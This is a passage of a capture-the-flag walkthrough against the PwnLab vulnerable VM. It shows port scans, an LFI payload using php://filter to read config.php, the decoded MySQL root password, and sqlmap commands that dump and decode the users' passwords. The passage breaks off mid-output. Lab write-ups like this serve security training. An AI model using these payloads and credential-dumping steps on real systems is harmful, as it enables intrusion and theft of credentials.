</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.140/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-08-22 13:17:05 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 111/tcp on 10.1.1.140                                   &lt;br/&gt;
</span><span class='line'>Discovered open port 3306/tcp on 10.1.1.140                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.140                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 59968/tcp on 10.1.1.140    &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.140
</span><span class='line'>Host is up <span class="o">(</span>0.00028s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-title: PwnLab Intranet Image Hosting
</span><span class='line'>111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35271/udp  status
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">100024</span>  <span class="m">1</span>          59968/tcp  status
</span><span class='line'>3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
</span><span class='line'><span class="p">|</span> mysql-info:
</span><span class='line'><span class="p">|</span>   Protocol: 53
</span><span class='line'><span class="p">|</span>   Version: .5.47-0+deb8u1
</span><span class='line'><span class="p">|</span>   Thread ID: 38
</span><span class='line'><span class="p">|</span>   Capabilities flags: 63487
</span><span class='line'><span class="p">|</span>   Some Capabilities: ODBCClient, LongPassword, SupportsCompression, Speaks41ProtocolOld, InteractiveClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, LongColumnFlag, FoundRows, SupportsTransactions, Support41Auth
</span><span class='line'><span class="p">|</span>   Status: Autocommit
</span><span class='line'><span class="p">|</span>_  Salt: <span class="p">&amp;</span>amp<span class="p">;</span>AVi2YKInpe-Lv1.3R<span class="p">&amp;</span>amp<span class="p">;</span>d
</span><span class='line'>59968/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span>
</span><span class='line'>MAC Address: 00:0C:29:11:CE:27 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
</span><span class='line'>OS details: Linux 3.2 - 4.4
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Based on the result of NMAP scan, firstly, I found port 80 and 3306 is open.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.140
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET IP address found in the <span class="p">&amp;</span>lsquo<span class="p">;</span>location<span class="p">&amp;</span>rsquo<span class="p">;</span> header. The IP is <span class="p">&amp;</span>ldquo<span class="p">;</span>127.0.1.1<span class="p">&amp;</span>rdquo<span class="p">;</span>.
</span><span class='line'>+ OSVDB-630: GET IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://127.0.1.1/images/&quot;</span>&gt;http://127.0.1.1/images/&lt;/a&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>.
</span><span class='line'>+ SZYEPUYV Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false </span>positives.
</span><span class='line'>+ GET Cookie PHPSESSID created without the httponly flag
</span><span class='line'>+ GET /config.php: PHP Config file may contain database IDs and passwords.
</span><span class='line'>+ OSVDB-3268: GET /images/: Directory indexing found.
</span><span class='line'>+ OSVDB-3268: GET /images/?pattern<span class="o">=</span>/etc/*<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">sort</span><span class="o">=</span>name: Directory indexing found.
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span><span class='line'>+ GET /login.php: Admin login page/section found.
</span></code></pre></td></tr></table></div></figure></p>

<p>From the nikto scan, I noticed that <code>/login.php</code> is found which could be the Admin login page, and <code>/images/</code> directory indexing found, and last but not least, <code>/config.php</code> is found which may contain database IDs and passowrds.</p>

<p>Then I use firefox to open the target website and have a look around.</p>

<p>I was hanging on here for quite a while, after trying brute force the login, tring SQL injection and trying brute force directory but all failed&hellip; I finally found a <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/" title="Local File Inclusion with PHP wrappers">LFI vulnerability</a> on the <code>page</code> parameter.</p>

<p>by exploiting this LFI vulnerability and based on the previous Nickto scan result (<code>config.php</code> is found and may contain DB login):</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# curl &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.140/?page=php://filter/convert.base64-encode/resource=config&quot;</span>&gt;http://10.1.1.140/?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>config&lt;/a&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;body&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;center&gt;
</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://f4l13n5n0w.github.io/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
</span><span class='line'>PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+&lt;/center&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;root@kali:~/myExercises/pwnlab_init#
</span><span class='line'>root@kali:~/myExercises/pwnlab_init# <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">|</span> base64 <span class="p">&amp;</span>ndash<span class="p">;</span>decode
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>?php
</span><span class='line'><span class="nv">$server</span>   <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>localhost<span class="p">&amp;</span>rdquo<span class="p">;;</span>
</span><span class='line'><span class="nv">$username</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>root<span class="p">&amp;</span>rdquo<span class="p">;;</span>
</span><span class='line'><span class="nv">$password</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>H4u%QJ_H99<span class="p">&amp;</span>rdquo<span class="p">;;</span>
</span><span class='line'><span class="nv">$database</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>Users<span class="p">&amp;</span>rdquo<span class="p">;;</span>
</span><span class='line'>?&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Cool, now I got the database ROOT login (<font color="red"><code>root/H4u%QJ_H99</code></font>) and the DB name is <font color="red"><code>Users</code></font>, then I use <code>sqlmap</code> to check target DB</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# sqlmap -d <span class="p">&amp;</span>lsquo<span class="p">;</span>mysql://root:H4u%QJ_H99@10.1.1.140:3306/Users<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>tables -D Users
</span><span class='line'>         _
</span><span class='line'> &lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt;<span class="p">|</span> <span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt; &lt;/strong&gt;&lt;em&gt;  <span class="o">{</span>1.0.8.2#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt; -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="p">&amp;</span>lsquo<span class="p">;|</span> . <span class="p">|</span>
</span><span class='line'><span class="p">|</span>&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;/strong&gt;,<span class="p">|</span>  &lt;em&gt;<span class="p">|</span>
</span><span class='line'>      <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>           <span class="p">|</span>_<span class="p">|</span>   &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://sqlmap.org&quot;</span>&gt;http://sqlmap.org&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>!<span class="o">]</span> legal disclaimer: Usage of sqlmap <span class="k">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="p">&amp;</span>rsquo<span class="p">;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> starting at 20:02:54&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 established
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching tables <span class="k">for</span> database: <span class="p">&amp;</span>lsquo<span class="p">;</span>Users<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'>Database: Users
</span><span class='line'><span class="o">[</span><span class="m">1</span> table<span class="o">]</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+
</span><span class='line'><span class="p">|</span> users <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 closed&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> shutting down at 20:02:54
</span></code></pre></td></tr></table></div></figure></p>

<p>Got the table name is <code>users</code>, then dump the table:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# sqlmap -d <span class="p">&amp;</span>lsquo<span class="p">;</span>mysql://root:H4u%QJ_H99@10.1.1.140:3306/Users<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>dump -T users -D Users
</span><span class='line'>         _
</span><span class='line'> &lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt;<span class="p">|</span> <span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt; &lt;/strong&gt;&lt;em&gt;  <span class="o">{</span>1.0.8.2#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt; -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="p">&amp;</span>lsquo<span class="p">;|</span> . <span class="p">|</span>
</span><span class='line'><span class="p">|</span>&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;/strong&gt;,<span class="p">|</span>  &lt;em&gt;<span class="p">|</span>
</span><span class='line'>      <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>           <span class="p">|</span>_<span class="p">|</span>   &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://sqlmap.org&quot;</span>&gt;http://sqlmap.org&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>!<span class="o">]</span> legal disclaimer: Usage of sqlmap <span class="k">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="p">&amp;</span>rsquo<span class="p">;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> starting at 20:03:23&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 established
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching columns <span class="k">for</span> table <span class="p">&amp;</span>lsquo<span class="p">;</span>users<span class="p">&amp;</span>rsquo<span class="p">;</span> in database <span class="p">&amp;</span>lsquo<span class="p">;</span>Users<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;user&#39;</span>, u<span class="s1">&#39;varchar(30)&amp;lsquo;], [u&#39;</span>pass<span class="p">&amp;</span>rsquo<span class="p">;</span>, u<span class="s1">&#39;varchar(30)&amp;lsquo;]]&amp;hellip;</span>
</span><span class='line'><span class="s1">[20:03:24] [INFO] fetching entries for table &#39;</span>users<span class="p">&amp;</span>rsquo<span class="p">;</span> in database <span class="p">&amp;</span>lsquo<span class="p">;</span>Users<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> analyzing table dump <span class="k">for</span> possible password hashes
</span><span class='line'>Database: Users
</span><span class='line'>Table: users
</span><span class='line'><span class="o">[</span><span class="m">3</span> entries<span class="o">]</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> pass             <span class="p">|</span> user   <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> <span class="nv">aVN2NVltMkdSbw</span><span class="o">==</span> <span class="p">|</span> kane   <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="nv">Sld6WHVCSkpOeQ</span><span class="o">==</span> <span class="p">|</span> kent   <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="nv">U0lmZHNURW42SQ</span><span class="o">==</span> <span class="p">|</span> mike   <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> table <span class="p">&amp;</span>lsquo<span class="p">;</span>Users.users<span class="p">&amp;</span>rsquo<span class="p">;</span> dumped to CSV file <span class="p">&amp;</span>lsquo<span class="p">;</span>/root/.sqlmap/output/10.1.1.140/dump/Users/users.csv<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 closed&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> shutting down at 20:03:24
</span></code></pre></td></tr></table></div></figure></p>

<p>Cool, here we go, got the username and password (base64 encoded), and the user/pass are:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>kane / iSv5Ym2GRo
</span><span class='line'>kent / JWzXuBJJNy
</span><span class='line'>mike / SIfdsTEn6I
</span></code></pre></td></tr></table></div></figure></p>

<p>I also checked if I can write file via MySQL, but sounds like we don&rsquo;t have enough privilege.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# sqlmap -d <span class="p">&amp;</span>lsquo<span class="p">;</span>mysql://root:H4u%QJ_H99@10.1.1.140:3306/Users<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>current-user <span class="p">&amp;</span>ndash<span class="p">;</span>is-dba
</span><span class='line'>         _
</span><span class='line'> &lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt;<span class="p">|</span> <span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt; &lt;/strong&gt;&lt;em&gt;  <span class="o">{</span>1.0.8.2#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt; -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="p">&amp;</span>lsquo<span class="p">;|</span> . <span class="p">|</span>
</span><span class='line'><span class="p">|</span>&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;/strong&gt;,<span class="p">|</span>  &lt;em&gt;<span class="p">|</span>
</span><span class='line'>      <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>           <span class="p">|</span>_<span class="p">|</span>   &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://sqlmap.org&quot;</span>&gt;http://sqlmap.org&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
